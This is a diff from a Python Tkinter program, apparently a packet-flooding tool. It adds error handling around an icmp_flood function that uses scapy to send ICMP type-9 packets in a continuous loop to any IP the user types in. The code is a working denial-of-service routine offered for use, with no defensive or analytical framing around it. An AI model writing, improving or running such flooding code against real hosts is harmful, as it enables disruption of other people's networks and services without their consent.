@@ -13,10 +13,13 @@ def main():
     root = Tk()
 
     def icmp_flood():
-        global status_local
-        while status_local == "Enabled":
-            flood = IP(dst=ip.get())/ICMP(type=9)
-            send(flood)
+        try:
+            global status_local
+            while status_local == "Enabled":
+                flood = IP(dst=ip.get())/ICMP(type=9)
+                send(flood)
+        except socket.gaierror:
+            status.config(text="Incorrect IP format.", fg="red")
 
     def switch(event):
         global status_local
